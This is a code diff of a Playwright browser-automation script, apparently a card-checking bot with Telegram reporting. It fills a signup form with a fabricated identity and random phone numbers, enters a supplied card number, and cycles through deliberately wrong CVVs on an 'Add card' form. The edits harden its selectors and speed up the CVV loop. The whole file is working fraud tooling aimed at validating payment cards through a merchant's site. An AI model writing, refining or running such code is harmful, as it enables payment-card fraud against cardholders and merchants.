@@ -33,23 +33,24 @@ async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: in
         # STEP 1 — Email
         await page.wait_for_selector("#email-input", state="visible", timeout=TIMEOUT)
         await page.fill("#email-input", identity["email"])
-        await page.click("button.v-button:has(div:text('Continue'))")
+        await page.click("xpath=//button[normalize-space(.)='Continue']")
 
         # Phone
         await page.wait_for_selector("#login-phone-input-number", state="visible", timeout=TIMEOUT)
         phone = (
-            random.choice(["201", "202", "203", "205", "206", "207"])
-            + random.choice(["201", "202", "303", "404"])
+            random.choice(["201", "202", "203", "205", "206", "207", "208", "209"])
+            + random.choice(["201", "202", "303", "404", "505", "606"])
             + "".join(random.choices("0123456789", k=4))
         )
         await page.fill("#login-phone-input-number", phone)
-        await page.check("input.v-checkbox[type='checkbox']")
-        await page.click("button.v-button:has(div:text('Next'))")
+        await page.evaluate("() => { const cb = document.querySelector('input.v-checkbox[type=\"checkbox\"]'); if(cb && !cb.checked) cb.click(); }")
+        await page.click("xpath=//button[normalize-space(.)='Next']")
 
         # STEP 2 — Card info
         await page.wait_for_selector("#card-input", state="visible", timeout=TIMEOUT)
         await page.fill("#first-name-input", identity["first_name"])
         await page.fill("#last-name-input", identity["last_name"])
+        await page.click("#card-input", click_count=3)
         await page.fill("#card-input", cc)
         await page.fill("#expiration-input", mm + yy)
         await page.fill("#cvv-input", wrong_cvv)
@@ -68,9 +69,11 @@ async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: in
         await page.fill("#city-input", identity["city"])
         await page.fill("#stateProvinceCode-input", identity["state"])
         await page.fill("#zip-input", identity["zip"])
-        await page.click("div:text-is('Add card')")
 
-        # STEP 4 — CVV loop (ultra-fast)
+        await page.wait_for_selector("xpath=//div[normalize-space(text())='Add card']", state="visible", timeout=TIMEOUT)
+        await page.click("xpath=//div[normalize-space(text())='Add card']")
+
+        # STEP 4 — CVV loop (no tg_edit pause)
         used = {wrong_cvv}
         for _ in range(5):
             fake = get_wrong_cvv(real_cvv)
@@ -79,8 +82,9 @@ async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: in
             used.add(fake)
             try:
                 await page.wait_for_selector("#cvv-input", state="visible", timeout=TIMEOUT)
+                await page.click("#cvv-input", click_count=3)
                 await page.fill("#cvv-input", fake)
-                await page.click("div:text-is('Add card')")
+                await page.click("xpath=//div[normalize-space(text())='Add card']")
                 await page.wait_for_timeout(120)
             except Exception:
                 pass
